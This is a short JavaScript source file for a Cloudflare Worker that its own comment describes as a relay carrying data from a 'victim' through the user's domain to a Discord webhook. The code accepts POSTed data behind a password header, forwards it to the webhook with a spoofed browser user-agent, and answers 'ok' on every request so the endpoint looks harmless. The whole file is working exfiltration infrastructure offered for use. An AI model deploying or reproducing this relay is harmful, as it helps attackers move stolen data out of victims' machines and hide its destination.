// Cloudflare Worker: victim -> your domain -> your Discord webhook.
// Deploy, then post to https://<worker>/h with header x-k: <PASS>.

const PASS = "CHANGE_ME_LONG_RANDOM";
const HOOK = "https://discord.com/api/webhooks/ID/TOKEN";

export default {
  async fetch(req, env) {
    const url = new URL(req.url);
    if (url.pathname !== "/h") return new Response("ok", { status: 200 });
    if (req.method !== "POST") return new Response("ok", { status: 200 });
    if (req.headers.get("x-k") !== (env.PASS || PASS)) {
      return new Response("ok", { status: 200 });
    }

    const body = await req.arrayBuffer();
    const target = (env.HOOK || HOOK) + "?wait=true";
    const resp = await fetch(target, {
      method: "POST",
      headers: {
        "content-type": req.headers.get("content-type") || "application/octet-stream",
        "user-agent": "Mozilla/5.0",
      },
      body,
    });
    return new Response("ok", { status: 200, headers: { "x-up": String(resp.status) } });
  },
};
